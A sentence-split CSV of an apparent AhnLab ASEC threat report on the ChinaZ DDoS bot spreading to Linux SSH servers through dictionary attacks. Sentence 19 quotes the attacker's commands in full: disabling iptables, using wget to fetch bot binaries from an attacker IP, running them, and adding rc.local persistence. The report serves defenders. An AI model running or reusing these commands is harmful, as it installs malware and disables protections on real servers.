Number,Content
Sentence 1,"Posted By Sanseo , March 24, 2023
ChinaZ DDoS Bot Malware Distributed to Linux SSH Servers
AhnLab Security Emergency response Center (ASEC) has recently discovered the ChinaZ DDoS Bot malware being installed on inadequately managed Linux SSH servers."
Sentence 2,"As one of the Chinese threat groups that were first discovered around 2014, the ChinaZ group installs various DDoS bots on Windows and Linux systems."
Sentence 3,"[1] Major DDoS bots assumed to have been created by the ChinaZ threat group include XorDDoS, AESDDos, BillGates, and MrBlack."
Sentence 4,This article will cover the DDoS bot known as ChinaZ or ChinaZ DDoSClient.
Sentence 5,1.
Sentence 6,"Attack Campaigns Against Linux SSH Servers
While desktop environments are typically used by average users, servers are designed to provide specialized services."
Sentence 7,"Due to this, malware infections usually happen on desktop environments through web browsers or email attachments."
Sentence 8,Threat actors also distribute their malware disguised as normal programs to trick users into installing them.
Sentence 9,"The above methods, however, have limitations when trying to target server environments, so threat actors have to use a different approach."
Sentence 10,A prime example of this would be when targeting servers that are poorly managed or are open to vulnerability attacks due to not having been patched to the most recent version.
Sentence 11,Simple account credentials are a common form of poorly managed services as they are vulnerable to dictionary attacks.
Sentence 12,"For example, Remote Desktop Protocol (RDP) and MS-SQL services are one of the main attack vectors of Windows operating systems."
Sentence 13,"In Linux server environments, Secure Shell (SSH) services are a common target while the Telnet service is a target for dictionary attacks in old Linux servers or IoT environments where an embedded Linux OS has been installed."
Sentence 14,The ChinaZ threat group’s ChinaZ DDoSClient that will be covered in this post is assumed to have been installed using account credentials obtained through the use of scanners and the SSH BruteForce malware.
Sentence 15,"The threat group most likely scanned port 22, the area where SSH services operate, before finding an active SSH service and performing a dictionary attack using commonly used SSH account credentials."
Sentence 16,"User	Password	Attack Target
root	–	45.113.163.219
Table 1."
Sentence 17,"Account credential used in attacks by ChinaZ

After logging in, the threat group then used a command like the one below to install ChinaZ on the Linux server."
Sentence 18,"Additionally, the IP address of the threat actor who logged in to the SSH server and the address used to download ChinaZ are the same."
Sentence 19,"# service iptables stop
# wget hxxp://45.113.163.219/linux64
# nohup /root/linux64 > /dev/null 2>&1 &
# chmod 777 linux64
# ./linux64
# chmod 0755 /root/linux64
# nohup /root/linux64 > /dev/null 2>&1 &
# chmod 0777 linux64
# chmod u+x linux64
# ./linux64 &
# chmod u+x linux64
# ./linux64 &
# cd /tmp
# service iptables stop
# wget hxxp://45.113.163.219/linux32
# nohup /root/linux32 > /dev/null 2>&1 &
# chmod 777 linux32
# ./164
# chmod 0755 /root/linux32
# nohup /root/linux32 > /dev/null 2>&1 &
# chmod 0777 linux32
# chmod u+x linux32
# ./linux32 &
# chmod u+x dos6cc4
# ./linux32 &
# cd /tmp
# echo “cd /root/”>>/etc/rc.local
# echo “./linux64&”>>/etc/rc.local
# echo “./linux32&”>>/etc/rc.local
# echo “/etc/init.d/iptables stop”>>/etc/rc.local

The threat actor disabled iptables (which is also the firewall), and used wget to install ChinaZ DDoSClient which has been built for x86 and x64 architectures."
Sentence 20,The threat actor logged into the root account and installed the downloaded malware into the /root directory.
Sentence 21,The later installed ChinaZ was executed and registered to rc.local to maintain persistence so that it would operate even after reboots.
Sentence 22,2.
Sentence 23,"ChinaZ DDoSClient (Linux)
A variety of information set by the creator of ChinaZ can be obtained since its debug information is included in its binary."
Sentence 24,"Adding to this, it is also a type of open-source malware with a public source code."
